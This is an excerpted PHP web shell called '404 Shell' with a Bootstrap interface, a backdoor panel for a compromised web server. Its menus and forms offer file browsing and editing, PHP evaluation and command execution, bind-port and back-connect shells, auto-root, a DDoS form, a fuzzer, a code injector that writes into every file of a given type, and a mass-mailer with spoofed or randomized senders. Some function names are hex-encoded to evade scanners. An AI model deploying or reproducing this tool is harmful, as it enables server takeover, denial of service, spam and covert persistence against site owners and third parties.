...
define('IS_PHPINFO', (strpos($dis_func, "phpinfo") == false ? 1 : 0));
@set_time_limit(0);
...
if ($pass) {
    if ($action == 'login' && $pass == md5($password)) {
        $_SESSION[$prefixme.'loginpass'] = md5($password);
        $action = 'file';
        if(isset($_SESSION[$prefixme.'loginpost'])){
            extract($_SESSION[$prefixme.'loginpost'], EXTR_OVERWRITE);
            unset($_SESSION[$prefixme.'loginpost']);
        }
    }
    if (!($_SESSION[$prefixme.'loginpass'] && $_SESSION[$prefixme.'loginpass'] == $pass)) {
        unset($_SESSION[$prefixme.'loginpass']);
    	unset($_SESSION[$prefixme.'charsetpage']);
    	unset($_SESSION[$prefixme.'showupdate']);
    	unset($_SESSION[$prefixme.'updateready']);
    	session_regenerate_id(true);
    	//session_destroy();
    	if(!isset($_SESSION[$prefixme.'loginpost'])) $_SESSION[$prefixme.'loginpost'] = $_POST;
...
<!--BOOTSTRAP-->
<title>404 Shell | With Bootstrap - Version ' . $version . '</title>
<style>
.morecontent span {
	display: none;
}
...
.alt1 td{border-top:1px solid white;border-bottom:1px solid white;background:white;padding:5px 15px 5px 5px;}
.alt2 td{border-top:1px solid white;border-bottom:1px solid white;background:white;padding:5px 15px 5px 5px;}
.focus td{border-top:1px solid black;border-bottom:1px solid black;background:green;padding:5px 15px 5px 5px;}
.head td{color:white; border-top:1px solid black;border-bottom:1px solid black;background:black;padding:5px 15px 5px 5px;font-weight:bold;}
...
function CheckAll(form, cval) {
	for(var i=0;i<form.elements.length;i++) {
		var e = form.elements[i];
		if (e.name == \'chkall\' || e.name == \'chkallbx\' || e.name == \'dl[]\')
		e.checked = cval;//form.chkall.checked;
    }
}
function $(id) {
	return document.getElementById(id);
  ...
  <div class="container-fluid">
    ...
    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
      <ul class="nav navbar-nav">
        <li><a href="javascript:g(\'file\', \'' . str_replace("'", "\'", $_SERVER["DOCUMENT_ROOT"]) . '\', null, null, null, null, null, null, \'' . str_replace("'", "\'", $_SERVER["DOCUMENT_ROOT"]) . '\');"><span class="glyphicon glyphicon-th-list" aria-hidden="true" style="font-size:19px;"></span></a></li>
        <li><a href="javascript:g(\'process\');"><span class="glyphicon glyphicon-tasks" aria-hidden="true" style="font-size:18px;padding-top:3px;"></span></a></li>
        <!--MYSQL-->
		<li class="dropdown">
          <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">MYSQL<span class="caret"></span></a>
          <ul class="dropdown-menu">
            <li><a href="javascript:g(\'mysqladmin\');">MySQL Manager</a></li>
            <li><a href="javascript:g(\'sqlfile\');">MySQL Upload & Download</a></li>
          </ul>
        </li>
		<!--PHP-->
		<li class="dropdown">
          ...
          <ul class="dropdown-menu">
            <li><a href="javascript:g(\'phpenv\');">PHP Variable</a></li>
            <li><a href="javascript:g(\'pob\');">PHP Obfuscator</a></li>
			<li><a href="javascript:g(\'laev\');">' . "\x45\x76\x61\x6C" . 'uate PHP Code</a></li>
          </ul>
        </li>
		<!--CODE-->
		<li class="dropdown">
          ...
          <ul class="dropdown-menu">
            <li><a href="javascript:g(\'cinj\');">Code Injector</a></li>
            <li><a href="javascript:g(\'cej\');">Code Ejector</a></li>
          </ul>
        </li>
		<!--OTHER-->
		<li class="dropdown">
          ...
          <ul class="dropdown-menu">
			<li><a href="javascript:g(\'fuzz\');">Fuzz Server</a></li>
			<li><a href="javascript:g(\'dos\');">DDoS</a></li>
			<li><a href="javascript:g(\'shell\');">' . "\x45\x78\x65\x63" . 'ute Command</a></li>
			<li><a href="javascript:g(\'bindport\');">Bind Port</a></li>
			<li><a href="javascript:g(\'backconnect\');">Back Connect</a></li>
			<li><a href="javascript:g(\'aroot\');">Auto Root</a></li>
			<li><a href="javascript:g(\'secinfo\');">Security Information</a></li>
			<li><a href="javascript:g(\'email\');">Email</a></li>
			<li><a href="javascript:g(\'stringtools\');">String Tools</a></li>
			<li><a href="javascript:g(\'portscan\');">Port Scan</a></li>
          </ul>
        </li>
      </ul>

	  <ul class="nav navbar-nav navbar-right">
        <li><a href="javascript:g(\'SelfRemove\');" style="color:red;"><span class="glyphicon glyphicon-fire" aria-hidden="true"></span> REMOVE SELF</a></li>
        <li class="dropdown">
          <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false"><span class="glyphicon glyphicon-cog" aria-hidden="true"></span> <span class="caret"></span></a>
          <ul class="dropdown-menu">
			<li><a href="javascript:g(\'settings\');">Shell Settings</a></li>
			<li><a href="javascript:g(\'checkupdates\');">Check for Shell Update</a></li>
			<li><a href="javascript:g(\'logout\');">Logout</a></li>
          </ul>
        </li>
      </ul>
    </div><!-- /.navbar-collapse -->
...
formhead(array("name"=>"godir"));
    makehide("view_writable", 0);
...
;
echo '<table class="table" id="maintable" width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>';
$errmsg && m($errmsg);
...
function shutDownFunction($phpcode, $action, $charsetpage, $charsetpagedb) {
    ...
    if ($error['type'] == 1) {
        ...
        p('<script src="//ajaxorg.github.io/ace-builds/src-noconflict/ace.js"></script>');
        printaceext();
...
if ($action == 'phpinfo') {
    ...
    !$all && $all = 0;
    $used = $all - $free;
    p('<!--<h2><span class="label" style="font-size:14px;background:black;color:white;">Disk Space: <span style="color:black;">' . sizecount($free) . '</span> of <span style="color:black;">' . sizecount($all) . '</span> (<span style="color:black;">' . @round(100 / ($all / $free), 2) . '%</span>)</span></h2>-->');
    
	p('<span style="color:black;">Free ' . sizecount($free) . '</span>');
	p('|');
...
;
echo '</span></span> ';
echo'<kbd><span class="glyphicon glyphicon-barcode" aria-hidden="true"></span> ';
...
echo getcfg("s\x61f\x65_mo\x64e");
    ...
    $n         = count($path);
    for ($i = 0; $i < $n - 1; $i++) {
        $cwd_links .= '<span class="label label-default" style="font-size:13px;"><a href="javascript:godir(\'';
        for ($j = 0; $j <= $i; $j++) {
            $cwd_links .= str_replace("'", "\'", $path[$j]) . '/';
        }
        $cwd_links .= '\');">' . $path[$i] . '/</a></span> ';
    }
    ;
...
<div style="background:#eee;margin-bottom:10px;">
	<table class="table" id="pathnav" width="100%" border="0" cellpadding="5" cellspacing="0">
		<tr>
			<td width="100%">';
	...
	<table class="table" id="inputnav" width="100%" border="0" cellpadding="5" cellspacing="0" style="display:none;">
	<tr><td nowrap>Current Directory (';
    echo $dir_writeable;
    ;
    echo ', ';
    ...
    ;
    echo ')</td>
			<td width="100%"><input class="form-control" id="userdir" onkeypress="if (event.keyCode == 13){ event.preventDefault(); window.godir(this.value); return false;}" onmouseover="this.focus();" class="input" name="dir" value="';
    echo $nowpath;
    ;
    echo '" type="text" style="width:99%;margin:0 8px;"></td>
			<td nowrap><input class="form-control" value="GO" type="button" onclick="window.godir($(\'userdir\').value);"></td>
		</tr>
	</table>
';
    if (IS_WIN && IS_COM) {
...
formhead(array("name"=>'fuf','enctype'=>'multipart/form-data'));
makehide("uploaddir", $nowpath);
makehide("dir", $nowpath);
formfoot();
formhead(array("name"=>'filelist'));
...
makehide('dir', $nowpath);
	...
	p('<a href="javascript:godir(\'' . str_replace("'", "\'", $_SERVER["DOCUMENT_ROOT"]) . '\');"><span class="glyphicon glyphicon-globe" aria-hidden="true"></span></a>');
    ...
    p(' | View Writable ( <a href="javascript:godir(\'' . str_replace("'", "\'", $nowpath) . '\',\'dir\');"><span class="glyphicon glyphicon-folder-open" aria-hidden="true"></span></a>');
    p(' | <a href="javascript:godir(\'' . str_replace("'", "\'", $nowpath) . '\',\'file\');"><span class="glyphicon glyphicon-file" aria-hidden="true"></span></a> )');
    p(' | <a href="javascript:createdir();"><span class="glyphicon glyphicon-plus" aria-hidden="true"></span> <span class="glyphicon glyphicon-folder-open" aria-hidden="true"></span></a> | <a href="javascript:createfile(\'' . str_replace("'", "\'", $nowpath) . '\');"><span class="glyphicon glyphicon-plus" aria-hidden="true"></span> <span class="glyphicon glyphicon-file" aria-hidden="true"></span></a>');
	p('<br /><br />');
	
    p('<button class="bt" type="button" data-toggle="collapse" data-target="#findbt" aria-expanded="false" aria-controls="collapseExample">Find <span class="glyphicon glyphicon-file" aria-hidden="true"></span> or <span class="glyphicon glyphicon-folder-open" aria-hidden="true"></span></button> <button class="bt" type="button" data-toggle="collapse" data-target="#uploadbt" aria-expanded="false" aria-controls="collapseExample1">Upload <span class="glyphicon glyphicon-file" aria-hidden="true"></span> or <span class="glyphicon glyphicon-folder-open" aria-hidden="true"></span></button>');
    p('<br /><br />');

	p('<div class="collapse" id="findbt"><div class="well">');
	p('<div style="padding:5px 0;"><form action="' . $self . '" method="POST" onSubmit="window.onbeforeunload = null;">Find string in files(current folder): <input onmouseover="this.focus();" class="form-control" name="findstr" value="' . $findstr . '" type="text" /> <input class="form-control" value="Find" type="submit" /> Type: <input onmouseover="this.focus();" class="form-control" name="writabledb" value="' . $writabledb . '" type="text" />');
    makeselect(array('name' => 'findin',
        'option' => array('Find in File Names','Find in File Content'),
        'selected' => $findin,
        'nokey' => 1));
    p('<input  class="form-control" name="dir" value="' . $dir . '" type="hidden" /> <label><input name="re" value="1" type="checkbox" ' . ($re ? 'checked' : '') . ' /> Regular Expressions</label> <label><input name="subdirs" value="1" type="checkbox" ' . ($subdirs ? 'checked' : '') . ' /> Search Subdirectories</label></form></div></td></tr>');
	p('</div></div>');

    p('<div class="collapse" id="uploadbt"><div class="well">');
    p('<div><input class="form-control" name="uploadfile[]" multiple="multiple" value="" type="file" form="fuf"/> <input class="form-control" name="doupfile" value="Upload" type="submit" form="fuf"/></div>');
    p('</div></div>');
	
	p('<span class="glyphicon glyphicon-arrow-left" aria-hidden="true"></span><a href="javascript:godir(\'' . str_replace("'", "\'", getUpPath($nowpath)) . '\');"> Parent Directory</a>');
	p('<br /><br />');
  ...
  if (!empty($dirdata)){
        ...
        if ($dirdb['filename'] != '..' && $dirdb['filename'] != '.') {
			...
			<div class="panel panel-default">
			  <div class="panel-heading">
				<h3 class="panel-title"><input name="dl[]" type="checkbox" value="' . $dirdb['server_link'] . '"> <span class="label label-primary"><span class="glyphicon glyphicon-folder-open" aria-hidden="true"></span></span> <a href="javascript:godir(\'' . str_replace("'", "\'", $dirdb['server_link']) . '\');">' . $dirdb['filename'] . '</a></h3>
			  </div>
			  <div class="panel-body">
				...
				<a href="javascript:rename(\'' . str_replace("'", "\'", $dirdb['server_link']) . '\');">
						...
						</a> | <a href="javascript:dofile(\'downfolder\',\'' . str_replace("'", "\'", $dirdb['server_link'])  . '\');">
    ...
    p('<tr bgcolor="white" stlye="border-top:0px solid white;border-bottom:0px solid #ddd;"><td colspan="6" height="5"></td></tr>');
    $file_i = '0';
    if (!empty($filedata)) {
...
<div class="panel panel-default">
  <div class="panel-heading">
	...
	<input name="dl[]" type="checkbox" value="' . $filedb['server_link'] . '">
	<span class="label label-info"><span class="glyphicon glyphicon-file" aria-hidden="true"></span></span> ' . ((strpos($filedb['server_link'], $_SERVER["DOCUMENT_ROOT"]) !== false || strpos(realpath($filedb['server_link']), $_SERVER["DOCUMENT_ROOT"]) !== false) ? '
	<a href="' . (isset($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off' ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . (str_replace("//", "/", "/" . $fileurl)) . '" target="_blank">
	' . $filedb['filename'] . '
	</a>
	' : $filedb['filename']) . '
	</h3>
...
');
            ...
            p('<a href="javascript:dofile(\'downfile\',\'' . str_replace("'", "\'", $filedb['server_link']) . '\');"><span class="glyphicon glyphicon-download" aria-hidden="true"></span></a> | ');
            p('<a href="javascript:copyfile(\'' . str_replace("'", "\'", $filedb['server_link']) . '\');"><span class="glyphicon glyphicon-copy" aria-hidden="true"></span></a> | ');
            p('<a href="javascript:opfile(\'editfile\',\'' . str_replace("'", "\'", $filedb['server_link']) . '\',\'' . $filedb['dirlink'] . '\');"><span class="glyphicon glyphicon-edit" aria-hidden="true"></span></a> | ');
            p('<a href="javascript:rename(\'' . str_replace("'", "\'", $filedb['server_link']) . '\');"><span class="glyphicon glyphicon-text-color" aria-hidden="true"></span></a>');			
			p('
  </div>
</div>');
            $file_i++;
...
$wcount = 11;
        ...
        if (trim($res) == ''){
            ...
            p('<td width="2%" nowrap><input name="pid[]" type="checkbox" value="' . $pid. '"></td>');
                        ...
                        p('<td>' . $psln[8] . '</td>');
                        p('<td>' . $psln[9] . '</td>');
                        p('<td><a href="javascript:killproc(\'' . $pid . '\');"><span class="label label-danger"><span class="glyphicon glyphicon-remove" aria-hidden="true"></span></span></a></td>');
                        $output .= "</tr>";
                }
            }
        }
...
p('<tr class="' . bg() . '"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form, this.checked)" /></td><td colspan="11"><a href="javascript:killprocm(\'killproc\');">Kill selected</a></td><td align="right"><span class="badge">' . $proccount . ' process(es)</span></td></tr>');
p('</table></form>');
formfoot();
...
';
    ...
    p('<p>Save path(fullpath): <input onmouseover="this.focus();" class="form-control" name="savepath" size="45" type="text" /> Choose a file: <input class="form-control" name="uploadfile" type="file" /> <a href="javascript:mysqlfile(\'mysqlupload\');">Upload</a></p>');
    p('<h2>Download file</h2>');
    p('<p>File: <input onmouseover="this.focus();" class="form-control" name="mysqldlfile" size="115" type="text" /> <a href="javascript:mysqlfile(\'mysqldown\');">Download</a></p>');
    makehide('dbhost');
    makehide('dbport');
    makehide('dbuser');
    makehide('dbpass');
    ...
    formhead(array(
        'title' => '<span style="font-size:19px;">MySQL Manager</span>',
        name => 'gooddbform'
    ));
    ...
    p('<p>');
    p('<span class="label label-default">DBHost:</span>');
    makeinput(array(
		'class' => 'form-control',
        'name' => 'dbhost',
        'size' => 20,
    ...
    p('<span class="label label-default">DBUser:</span>');
    makeinput(array(
		'class' => 'form-control',
        'name' => 'dbuser',
        'size' => 15,
    ...
    p('<span class="label label-default">DBPass:</span>');
    makeinput(array(
		'class' => 'form-control',
        'name' => 'dbpass',
        'size' => 15,
    ...
    p('<span class="label label-default">DBCharset:</span>');
    makeselect(array(
		'class' => 'form-control',
        'name' => 'charset',
        'option' => $charsetdb,
		...
		makeselect(array('name'=>'dbname','option'=>$dbs,'selected'=>$dbname,'onchange'=>'moddbname(this.options[this.selectedIndex].value)'));
			...
			if ($sql_query) {
					...
					if ($query) {
						...
						switch($DB->query_res($query))
						{
							...
							case 1:
								...
								p('<table class="table" border="0" cellpadding="3" cellspacing="0">');
								p('<tr class="head">');
				...
				if (count($tabledb)) {
					...
					p('<table class="table" border="0" cellpadding="0" cellspacing="0" id="lists">');
					p('<tr class="head">');
    ...
    echo "</select><input type='submit' class='bt' value='Convert'/><br><textarea onmouseover='this.focus();' name='input' cols='100' rows='25' style='margin-top:5px;width:100%;'>" . $input . "</textarea></form><pre class='ml1' style='white-space:normal;" . (empty($selectTool) ? 'display:none;' : '') . "margin-top:5px' id='strOutput'>";
    if (!empty($selectTool)) {
        if ($sf($selectTool))
...
<table class="table" width="100%">
	<tr>
	<td width="100%"><input onmouseover="this.focus();" type="text" name="to" class="form-control" placeholder="# or user@email.com"></td>
	</tr>
	<tr>
	<td><input placeholder="From Name" onmouseover="this.focus();" type="text" name="name" class="form-control"></td>
	</tr>
	<tr>
	<td><input placeholder="dummy@email.com or check box below for random" onmouseover="this.focus();" type="text" name="email" class="form-control"><input class="form-control" type="checkbox" value="1" name="randomfr" id="randomfr"><label for="randomfr" value="Randomize">Randomize</label></td>
	</tr>
	<tr>
	<td><input placeholder="reply-to@email.com" onmouseover="this.focus();" type="text" name="rt"  class="form-control"></td>
	</tr>
	<tr id="file">
	<td><input placeholder="Add File" type="file" name="file[]"/><input type="button" onclick="add()" value="Add More"  class="form-control"></td>
	</tr>
	<tr>
	<td><input placeholder="subject" onmouseover="this.focus();" type="text" name="subject"  class="form-control"></td>
	</tr>
	<tr>

	<td><textarea placeholder="Message" onmouseover="this.focus();" name="contents" style="width:100%"></textarea></td>
	</tr>
	<tr>
	<td><input type="checkbox" value="1" name="splitm" id="splitm"><label for="splitm" value="Split Message">Split Messages</label></td>
	</tr>
	<tr>
	<td><input class="form-control" placeholder="From Name" type="number" onmouseover="this.focus();" name="saf" value="140"></td>
	</tr>
	<tr>

	<td><input  class="form-control" type="number" onmouseover="this.focus();" min="1" value="1" name="times"></td>
	</tr>
	<tr>
...
echo '<form method="POST" onSubmit="window.onbeforeunload = null;">
           <input type="hidden" name="dos" />
                       IP
                       <input onmouseover="this.focus();" class="cmd form-control" name="ip" value="127.0.0.1" onfocus="if(this.value == \'127.0.0.1\')this.value = ;" onblur="if(this.value==)this.value=\'127.0.0.1\';"/>
                       <br/>Port
                       <input onmouseover="this.focus();" class="cmd form-control" name="port" value="80" onfocus="if(this.value == \'80\')this.value = ;" onblur="if(this.value==)this.value=\'80\';"/>
                       <br/>Timeout (Time in seconds)
                       <input onmouseover="this.focus();" type="text" class="cmd form-control" name="timeout" value="5" onfocus="if(this.value == \'5\')this.value = ;" onblur="if(this.value==)this.value=\'5\';" />
                       <br/>'."\x45x\x65".'cution Time (Time in seconds)
                       <input onmouseover="this.focus();" type="text" class="cmd form-control" name="exTime" value="10" onfocus="if(this.value == \'10\')this.value = ;" onblur="if(this.value==)this.value=\'10\';"/>
                       <br/>Number of Bytes per/packet
                       <input onmouseover="this.focus();" type="text" class="cmd form-control" name="noOfBytes" value="1048576" onfocus="if(this.value == \'1048576\')this.value = ;" onblur="if(this.value==)this.value=\'1048576\';"/>
...
?>
       <form method="POST" onSubmit="window.onbeforeunload = null;">
           <input type="hidden" name="fuzz" />
                       ...
                       <input onmouseover="this.focus();" class="cmd form-control" name="port" value="80" onfocus="if(this.value == '80')this.value = ;" onblur="if(this.value==)this.value='80';"/>
                       <br/>Timeout:
                       <input onmouseover="this.focus();" type="text" class="cmd form-control" name="time" value="5" onfocus="if(this.value == '5')this.value = ;" onblur="if(this.value==)this.value='5';"/>
                       <br/>Number of Times:
                       <input onmouseover="this.focus();" type="text" class="cmd form-control" name="times" value="100" onfocus="if(this.value == '100')this.value = ;" onblur="if(this.value==)this.value='100';" />
                       <br/>Message (The message Should be long and it will be multiplied with the value after it):
                       <input onmouseover="this.focus();" class="cmd form-control" name="message" value="%S%x--Some Garbage Here--%x%S" onfocus="if(this.value == '%S%x--Some Garbage here --%x%S')this.value = ;" onblur="if(this.value==)this.value='%S%x--Some Garbage here --%x%S';"/>
                       x
                       <input onmouseover="this.focus();" style="width: 30px;" class="cmd form-control" name="messageMultiplier" value="10" />
    ...
    if (isset($dir) && $dir != "" && isset($filetype) && $filetype != "" && isset($message) && $message != "") {
        ...
        echo '
<form method=\'POST\' onSubmit="window.onbeforeunload = null;">
                       Directory<input onmouseover="this.focus();" class="cmd form-control" name="dir" value="' . $nowpath . '" />
                       File Type
                       <input onmouseover="this.focus();" type="text" class="cmd form-control" name="filetype" value=".php" onblur="if(this.value==)this.value=\'.php\';" /><br/>
                       <textarea onmouseover="this.focus();" name="message" cols="110" rows="10" class="cmd" style="width:100%;"></textarea><br/>
...
<form method=\'POST\' onSubmit="window.onbeforeunload = null;">
                       Directory<input onmouseover="this.focus();" class="cmd form-control" name="dir" value="' . $nowpath . '" />
                   Mode<select style="width: 400px;" name="mode" class="cmd form-control">
...
maketext(array(
    ...
    p('<script src="//ajaxorg.github.io/ace-builds/src-noconflict/ace.js"></script>');
    printaceext();
    if (!$mobile) p('<script>var l=document.getElementsByTagName("textarea");for(i=0;i<l.length;++i){if(l[i].hasAttribute("data-editor")){var e=l[i];var t=e.getAttribute("data-editor");var n=document.createElement("div");n.style.cssText="width:100%;height:"+e.clientHeight+"px;";n.className=e.className;e.parentNode.insertBefore(n,e);e.style.cssText="display:none;";var r=ace.edit(n);r.renderer.setShowGutter(true);r.getSession().setValue(e.value);var i=ace.require("ace/ext/modelist");var s=i.getModeForPath("example.php").mode;r.getSession().setMode(s);r.setTheme("ace/theme/dreamweaver");e.form.onsubmit=function(t){window.onbeforeunload = null;e.value=r.getSession().getValue()}}}</script>');
    ...
    formhead(array(
        'title' => '<span class="label label-default" style="font-size:15px;"><span class="glyphicon glyphicon-edit" aria-hidden="true"></span> TEXT EDITOR</span>'
    ));
    makehide('action', 'file');
    makehide('dir', $nowpath);
    makeinput(array(
        'title' => '<span style="font-weight:bold;font-size:15px;">Current File (import new file name and new file)</span>',
        'name' => 'editfilename',
        'value' => $opfile,
        'newline' => 1
    ));
    ...
    p('<script src="//ajaxorg.github.io/ace-builds/src-noconflict/ace.js"></script>');
    printaceext();
    if (!$mobile) p('<script>var l=document.getElementsByTagName("textarea");for(i=0;i<l.length;++i){if(l[i].hasAttribute("data-editor")){var e=l[i];var t=e.getAttribute("data-editor");var n=document.createElement("div");n.style.cssText="width:100%;height:"+e.clientHeight+"px;";n.className=e.className;e.parentNode.insertBefore(n,e);e.style.cssText="display:none;";var r=ace.edit(n);r.renderer.setShowGutter(true);r.getSession().setValue(e.value);var i=ace.require("ace/ext/modelist");var s=i.getModeForPath("' . $opfile . '").mode;r.getSession().setMode(s);r.setTheme("ace/theme/dreamweaver");e.form.onsubmit=function(t){window.onbeforeunload = null;e.value=r.getSession().getValue()}}}</script>');
    formfooter();
    goback();
...
function m($msg){
    echo '<div class="alert alert-warning" role="alert" id="theresult" style="font-weight:bold;" ><span class="glyphicon glyphicon-exclamation-sign" aria-hidden="true"></span> ';
    echo $msg;
    echo '</div>';
}
...
function tbhead($id = ""){
    p('<table class="table" width="100%"' . ($id != "" ? ' id="' . $id . '"' : "") . ' border="0" cellpadding="4" cellspacing="0">');
}
function tbfoot()
{
    p('</table>');
...
function formhead($arg = array())
{
    ...
    p("<form name=\"$arg[name]\" id=\"$arg[name]\" enctype=\"$arg[enctype]\" action=\"$arg[action]\" onSubmit=\"window.onbeforeunload = null;\" method=\"$arg[method]\" $arg[target]>");
    if ($arg['title']) {
        p('<h2>' . $arg['title'] . '</h2>');
    }
}
